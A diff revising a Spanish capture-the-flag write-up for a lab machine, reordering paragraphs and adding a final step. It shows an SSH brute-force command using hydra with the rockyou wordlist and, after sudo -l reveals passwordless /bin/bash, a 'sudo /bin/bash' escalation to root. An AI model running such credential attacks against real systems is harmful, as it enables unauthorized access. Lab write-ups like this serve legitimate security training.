@@ -102,16 +102,6 @@ Megapixels                      : 0.207
 Ahora, con el nombre de usuario podemos hacer fuerza bruta contra el servicio SSH con `hydra`.
 
 ```
-
-```
-
-Conseguimos acceder al sistema mediante SSH.
-
-# Escalada de privilegios
-
-Una vez dentro investigamos los comandos que podemos ejecutar con permisos `sudo`.
-
-```
 > hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -128,7 +118,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 06:48:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-08 06:48:12
 ```
 
-Nos encontramos que podemos ejecutar el binario`/bin/bash` con permisos ``sudo`` y sin contraseña.
+Conseguimos acceder al sistema mediante SSH.
+
+# Escalada de privilegios
+
+Una vez dentro investigamos los comandos que podemos ejecutar con permisos `sudo`.
 
 ```
 borazuwarah@7dd5484e294a:~$ sudo -l
@@ -138,4 +132,11 @@ Matching Defaults entries for borazuwarah on 7dd5484e294a:
 User borazuwarah may run the following commands on 7dd5484e294a:
     (ALL : ALL) ALL
     (ALL) NOPASSWD: /bin/bash
+```
+
+Nos encontramos que podemos ejecutar el binario`/bin/bash` con permisos ``sudo`` y sin contraseña.
+
+```
+borazuwarah@7dd5484e294a:~$ sudo /bin/bash
+root@7dd5484e294a:/home/borazuwarah#
 ```
